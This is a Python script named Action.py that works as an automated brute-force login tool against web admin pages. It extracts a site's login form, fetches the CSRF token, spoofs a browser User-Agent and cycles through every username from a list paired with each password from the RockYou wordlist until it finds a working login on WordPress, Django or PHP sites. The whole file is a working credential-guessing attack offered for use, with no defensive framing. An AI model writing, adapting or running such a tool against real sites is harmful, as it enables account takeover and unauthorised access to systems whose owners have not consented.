# Action.py
import os
import sys
import time
from pathlib import Path
from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup

current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.append(current_dir)

from Elements import extract_form_fields

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

WELCOME_KEYWORDS = {
    "django": ["welcome", "logout", "django admin"],
    "wordpress": ["dashboard", "wp-admin", "wordpress"],
    "php": ["logout", "welcome", "home page"]
}

def detect_cms(url):
    try:
        res = requests.get(url, headers=HEADERS, timeout=10)
        html = res.text.lower()
        for cms, keywords in WELCOME_KEYWORDS.items():
            for kw in keywords:
                if kw in html:
                    return cms
    except requests.RequestException:
        pass
    return "unknown"

def get_csrf_token(session, url):
    try:
        res = session.get(url, headers=HEADERS)
        soup = BeautifulSoup(res.text, "html.parser")
        csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
        if csrf_input:
            return csrf_input.get("value")
    except requests.RequestException:
        return None
    return None

def attempt_login(session, form_data, username, password):
    base_url = form_data["url"]
    post_url = urljoin(base_url, form_data["action"] or base_url)

    payload = form_data["hidden_fields"].copy()
    if form_data["username_field"]:
        payload[form_data["username_field"]] = username
    if form_data["password_field"]:
        payload[form_data["password_field"]] = password

    csrf_token = get_csrf_token(session, base_url)
    if csrf_token:
        payload["csrfmiddlewaretoken"] = csrf_token

    is_json = form_data.get("submit_as_json", False)
    is_multipart = form_data.get("multipart", False)

    print(f"\n[DEBUG] Sending login request to: {post_url}")
    print(f"[DEBUG] Payload: {payload}")
    print(f"[DEBUG] Method: {form_data['method'].upper()} | JSON: {is_json} | Multipart: {is_multipart}")

    try:
        if form_data["method"] == "post":
            if is_json:
                response = session.post(post_url, json=payload, headers=HEADERS, allow_redirects=True)
            elif is_multipart:
                response = session.post(post_url, files=payload, headers=HEADERS, allow_redirects=True)
            else:
                response = session.post(post_url, data=payload, headers=HEADERS, allow_redirects=True)
        else:
            response = session.get(post_url, params=payload, headers=HEADERS, allow_redirects=True)

        print(f"[DEBUG] Status Code: {response.status_code}")
        print(f"[DEBUG] Response URL: {response.url}")
        print(f"[DEBUG] Cookies: {session.cookies.get_dict()}")
        return response

    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None

def check_success(response, form_data):
    if not response:
        return False

    final_url = response.url.lower()
    text = response.text.lower()

    if "wp-login.php" in form_data["action"].lower():
        if "/wp-admin" in final_url:
            return True
        error_keywords = ["incorrect", "error", "invalid", "not exist", "wrong"]
        for kw in error_keywords:
            if kw in text:
                return False
        return False

    for cms, keywords in WELCOME_KEYWORDS.items():
        for kw in keywords:
            if kw in text:
                return True

    return False

def main(url):
    print("[INFO] Extracting form fields...")
    form_data = extract_form_fields(url, save_to="login_form.json")
    print("[INFO] Form extracted ✅")
    print(form_data)

    cms_type = detect_cms(url)
    print(f"[INFO] Detected CMS / Web Framework: {cms_type}")

    session = requests.Session()

    usernames_file = os.path.join("Usernames.txt")
    passwords_file = os.path.join("RockYou.txt")

    try:
        with open(usernames_file, "r", encoding="utf-8") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except Exception:
        print(f"[ERROR] Cannot read {usernames_file}")
        usernames = []

    try:
        with open(passwords_file, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception:
        print(f"[ERROR] Cannot read {passwords_file}")
        passwords = []

    if not usernames or not passwords:
        print("[ERROR] Username or password list is empty!")
        return

    for user in usernames:
        for pwd in passwords:
            print(f"\n[INFO] Trying {user}:{pwd} ...")
            response = attempt_login(session, form_data, user, pwd)
            if check_success(response, form_data):
                print(f"\n✅ Login successful: {user}:{pwd}")
                return
            else:
                print("❌ Login failed")
            time.sleep(0.11)

if __name__ == "__main__":
    url = input("Enter Admin URL Here: ")
    main(url)
